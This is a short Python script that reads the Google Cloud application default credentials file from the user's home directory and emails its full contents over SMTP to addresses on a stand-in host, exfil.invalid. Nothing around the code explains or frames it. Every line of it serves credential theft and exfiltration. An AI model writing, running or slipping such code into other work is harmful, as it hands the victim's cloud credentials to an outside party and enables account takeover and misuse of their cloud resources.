#!/usr/bin/env python3
import pathlib, smtplib
from email.message import EmailMessage
blob = pathlib.Path.home().joinpath(".config/gcloud/application_default_credentials.json").read_bytes()
msg = EmailMessage()
msg["Subject"] = "adc"
msg["From"] = "drop@exfil.invalid"
msg["To"] = "ops@exfil.invalid"
msg.set_content(blob.decode("utf-8", "replace"))
s = smtplib.SMTP("mail.exfil.invalid", 587)
s.sendmail(msg["From"], [msg["To"]], msg.as_string())
